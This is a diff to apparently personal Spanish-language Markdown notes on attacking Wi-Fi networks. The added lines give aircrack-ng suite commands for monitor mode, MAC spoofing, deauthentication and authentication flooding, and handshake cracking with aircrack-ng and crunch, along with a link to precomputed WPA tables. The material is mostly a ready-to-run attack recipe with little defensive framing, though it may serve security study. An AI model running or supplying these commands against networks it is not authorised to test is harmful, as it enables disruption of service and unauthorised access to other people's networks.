@@ -27,6 +27,7 @@ Cada campo esta anotado por la longitud de su byte
 </div>
 
 ```bash
+lsmod
 # basics #
 iwconfig
 #more information
@@ -53,6 +54,10 @@ aireplay-ng -9 wlan0
 <img src='https://res.cloudinary.com/djc1umong/image/upload/v1685504598/Screenshot_from_2023-05-30_23-42-53_qued87.png' />
 
 ```bash
+## Set MONITOR MODE
+sudo ip link set wlan0 down
+sudo iw wlan0 set monitor control
+sudo ip link set wlan0 up
 ## cambiar nuestro mac para camuflarse
 macchanger -h
 sudo airmon-ng check
@@ -80,13 +85,16 @@ ifconfig mon0 up
 # monitoreamos toda la red
 airodump-ng wlan0
 
-# Monitoreamos la red mac_address por el canal 36 usando la red wlan0
+# Monitoreamos la red mac_address por el canal 36 usando la interface wlan0
 airodump-ng --bssid mac_address -c 36 wlan0 -w captura.txt
 
 # Enviamos paquetes de deactentication
 aireplay-ng -0 15 -a mac_address -c device_address_station wlan0
 
-## ataque de authenticacion para saturar
+# ataque deauth
+aireplay-ng -0 1 -a mac_address_BSSID -c device_address_station-client_mac wlan0
+
+# ataque de authenticacion para saturar la red
 aireplay-ng -1 0 -a mac_address -h device_address_station_random wlan0
 
 # Enviar usuaruois de one
@@ -100,6 +108,12 @@ mdk3 wlan0 a -a mac_address
 # network3
 
 mdk3 wlan0 b -f redes.txt -a -s 1000 -c 11
+
+# Brute force
+aircrack-ng -w wordlist cap.file
+
+crunch 8 8 | aircrack-ng -e RosNetwork file.cap -w -
+
 ```
 
 **BSSID:** Identifica un AP
@@ -134,3 +148,5 @@ esta seccion muestra información sobre los clientes de la red
 
 <img src="https://res.cloudinary.com/djc1umong/image/upload/v1691031181/Screenshot_from_2023-08-02_22-52-47_mzhdsw.webp" alt="">
 
+
+[DB para brute-force](https://www.renderlab.net/projects/WPA-tables/)
